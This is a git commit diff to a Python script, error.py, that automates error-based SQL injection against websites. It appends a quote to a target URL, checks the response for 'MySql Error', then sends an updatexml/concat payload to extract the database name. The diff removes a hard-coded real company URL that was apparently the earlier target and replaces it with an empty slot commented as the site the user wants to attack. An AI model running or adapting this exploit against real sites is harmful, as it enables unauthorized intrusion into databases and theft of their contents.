3b14bb50ae935aa5704da655b9d5c5012f724521
dacade <31815137+dacade@users.noreply.github.com>
2019-12-12 15:05:59 +0800

    Update error.py

--- error.py
+++ error.py
@@ -2,16 +2,20 @@ import requests
 import re
 import time
 
-fuckurl = 'http://www.zhuoce.com.cn/newMediaMarketing.php?cid=17&id=28'
+# please input you want to fuck web'url
+fuckurl = ''
+
 url = fuckurl+'%27'
 
 headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'}
 
 html = requests.get(url,headers=headers)
 text = html.text
-print(text)
+# print(text)
 if 'MySql Error' in text:
     # print('ok')
+
+    # get the tables
     fuck = fuckurl + '-@`%27`%20and%201=updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20and%20id=@`%27`'
     # print(fuck)
     html2 = requests.get(fuck,headers=headers)
